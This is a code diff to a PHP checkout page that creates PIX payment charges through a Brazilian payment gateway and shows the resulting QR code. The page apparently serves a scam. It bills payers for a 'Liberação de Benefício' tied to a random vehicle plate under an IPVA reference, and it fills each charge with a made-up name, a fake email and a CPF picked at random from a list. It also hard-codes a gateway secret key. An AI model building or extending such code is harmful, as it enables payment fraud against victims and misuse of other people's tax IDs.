@@ -40,43 +40,121 @@ $valorCentavos = intval($_POST["valorFinal"]);
 // Seleciona um CPF aleatório da lista
 $cpfAleatorio = $cpfs[array_rand($cpfs)];
 
-// Configurações da nova API Duckfy
-$apiUrl = 'https://app.usenivopay.com.br/api/v1/gateway/pix/receive';
-$publicKey = 'mateusblack361_nkpp68afe9fentzi';
-$privateKey = 'hc9slwp9u6oz7xpdv5l8wvyttkyadih1clapqa9kil17ho2jou0l89m2exgatonb';
+// Configurações
+$secretKey = "sk_0Ffy1JR6nj2WsZuOZvmCtiWO4eQ2WM5GlzWuXE4lyaYD";
+$apiUrl = "https://api.blackcatpagamentos.com/v1/transactions";
 
-// Estrutura conforme nova API Duckfy
-$identifier = uniqid('PIX_', true);
+// Gera dados do cliente
+$nomes_masculinos = [
+    'João', 'Pedro', 'Lucas', 'Miguel', 'Arthur', 'Gabriel', 'Bernardo', 'Rafael',
+    'Gustavo', 'Felipe', 'Daniel', 'Matheus', 'Bruno', 'Thiago', 'Carlos'
+];
+
+$nomes_femininos = [
+    'Maria', 'Ana', 'Julia', 'Sofia', 'Isabella', 'Helena', 'Valentina', 'Laura',
+    'Alice', 'Manuela', 'Beatriz', 'Clara', 'Luiza', 'Mariana', 'Sophia'
+];
+
+$sobrenomes = [
+    'Silva', 'Santos', 'Oliveira', 'Souza', 'Rodrigues', 'Ferreira', 'Alves', 
+    'Pereira', 'Lima', 'Gomes', 'Costa', 'Ribeiro', 'Martins', 'Carvalho', 
+    'Almeida', 'Lopes', 'Soares', 'Fernandes', 'Vieira', 'Barbosa'
+];
+
+// Gera dados do cliente
+$genero = rand(0, 1);
+$nome = $genero ? 
+    $nomes_masculinos[array_rand($nomes_masculinos)] : 
+    $nomes_femininos[array_rand($nomes_femininos)];
+
+$sobrenome1 = $sobrenomes[array_rand($sobrenomes)];
+$sobrenome2 = $sobrenomes[array_rand($sobrenomes)];
+
+$nome_cliente = "$nome $sobrenome1 $sobrenome2";
+$placa = chr(rand(65, 90)) . chr(rand(65, 90)) . chr(rand(65, 90)) . rand(0, 9) . rand(0, 9) . rand(0, 9) . rand(0, 9);
+
+// Gerar email baseado no nome
+function gerarEmail($nome) {
+    $nome = strtolower(trim($nome));
+    $nome = preg_replace('/[^a-z0-9]/', '', iconv('UTF-8', 'ASCII//TRANSLIT', $nome));
+    $dominios = ['gmail.com', 'hotmail.com', 'outlook.com', 'yahoo.com.br', 'uol.com.br'];
+    $dominio = $dominios[array_rand($dominios)];
+    
+    return $nome . rand(1, 999) . '@' . $dominio;
+}
+
+$email = gerarEmail($nome_cliente);
+
+// Preparar dados para a API
 $pixData = [
-    'identifier' => $identifier,
-    'amount' => $valorCentavos / 100, // Convertendo centavos para reais
-    'client' => [
-        'name' => 'Pagamento Produto',
-        'email' => 'pagamentoooo2@gmail.com',
-        'phone' => '11996568953',
-        'document' => preg_replace('/[^0-9]/', '', $cpfAleatorio)
+    'amount' => $valorCentavos, // Valor em unidades inteiras
+    'paymentMethod' => 'pix', // Definindo o método de pagamento como PIX
+    'pix' => [
+        'expiresInDays' => 1 // Expira em 1 dia
     ],
-    'dueDate' => date('Y-m-d', strtotime('+1 day')),
-    'callbackUrl' => "https://" . $_SERVER['HTTP_HOST'] . "/webhook.php"
+    'customer' => [
+        'name' => $nome_cliente,
+        'email' => $email,
+        'phone' => '(11) 99999-9999', // Telefone é obrigatório
+        'document' => [
+            'type' => 'cpf',
+            'number' => preg_replace('/[^0-9]/', '', $cpfAleatorio)
+        ],
+        'externalRef' => 'IPVA-' . $placa . '-' . time() // Referência externa
+    ],
+    'items' => [
+        [
+            'title' => 'Liberação de Benefício - Placa: ' . $placa,
+            'unitPrice' => $valorCentavos, // Valor em unidades inteiras
+            'quantity' => 1,
+            'tangible' => false,
+            'externalRef' => 'IPVA-' . $placa
+        ]
+    ],
+    'ip' => $_SERVER['REMOTE_ADDR'] ?? '127.0.0.1'
 ];
 
 try {
+    // Fazer requisição para a API
+    $authorization = 'Basic ' . base64_encode($secretKey . ':x');
+    
     $client = new Client();
     $response = $client->request('POST', $apiUrl, [
         'json' => $pixData,
         'headers' => [
+            'Authorization' => $authorization,
             'Content-Type' => 'application/json',
-            'x-public-key' => $publicKey,
-            'x-secret-key' => $privateKey
+            'Accept' => 'application/json'
         ],
     ]);
 
     $responseData = json_decode($response->getBody(), true);
-    $qrcodeData = $responseData['pix']['code'] ?? '';
-    $qrcodeImagem = "https://api.qrserver.com/v1/create-qr-code/?data=" . urlencode($qrcodeData) . "&size=300x300";
+    
+    if (!isset($responseData['id'])) {
+        throw new Exception("ID não encontrado na resposta da API");
+    }
+    
+    // Extrair os dados do PIX da resposta
+    $pixCopiaECola = '';
+    if (isset($responseData['pix']['qrcode'])) {
+        $pixCopiaECola = $responseData['pix']['qrcode'];
+    } elseif (isset($responseData['pix']['qrCode'])) {
+        $pixCopiaECola = $responseData['pix']['qrCode'];
+    } elseif (isset($responseData['pix']['code'])) {
+        $pixCopiaECola = $responseData['pix']['code'];
+    } elseif (isset($responseData['pix']['text'])) {
+        $pixCopiaECola = $responseData['pix']['text'];
+    } elseif (isset($responseData['qrcode'])) {
+        $pixCopiaECola = $responseData['qrcode'];
+    }
+    
+    // Se não conseguir obter os dados da API, usar valor default
+   
+     
+     $qrcodeImagem = "https://api.qrserver.com/v1/create-qr-code/?data=" . urlencode($pixCopiaECola) . "&size=300x300";
 
     // Insere a transação no banco de dados após sucesso
-    $transactionId = 'trans_' . uniqid() . '_' . bin2hex(random_bytes(4));
+    $transactionId = $responseData['id'];
     $criadoEm = date("Y-m-d H:i:s");
     $atualizadoEm = $criadoEm;
 
@@ -91,8 +169,15 @@ try {
 
 } catch (RequestException $e) {
     echo "Erro: " . $e->getMessage() . "\n";  
-    echo "Resposta: " . $e->getResponse()->getBody();
-    $qrcodeData = '';
+    if ($e->getResponse()) {
+        echo "Resposta: " . $e->getResponse()->getBody();
+    }
+    $pixCopiaECola = '';
+    $qrcodeImagem = '';
+} catch (Exception $e) {
+    echo "Erro: " . $e->getMessage() . "\n";
+    $pixCopiaECola = '';
+    $qrcodeImagem = '';
 }
 ?>
 
@@ -469,7 +554,7 @@ try {
 
 <!-- Código Pix Copia e Cola -->
 <div id="pixCodeContainer">
-    <span id="pixCode" contentEditable="true"><?php echo htmlspecialchars($qrcodeData, ENT_QUOTES, 'UTF-8'); ?></span>
+    <span id="pixCode" contentEditable="true"><?php echo htmlspecialchars($pixCopiaECola, ENT_QUOTES, 'UTF-8'); ?></span>
     <button id="btnCopiar" class="copy-button">Copiar</button>
 </div>
 
@@ -506,8 +591,8 @@ try {
     });
 
     // Obtém o QR Code gerado pelo PHP e exibe na tela
-    const qrCodeData = "<?php echo htmlspecialchars($qrcodeData, ENT_QUOTES, 'UTF-8'); ?>";
-    gerarQRCode(qrCodeData);
+    const qrCodeData = "<?php echo htmlspecialchars($pixCopiaECola, ENT_QUOTES, 'UTF-8'); ?>";
+gerarQRCode(qrCodeData);
 </script>
 
 
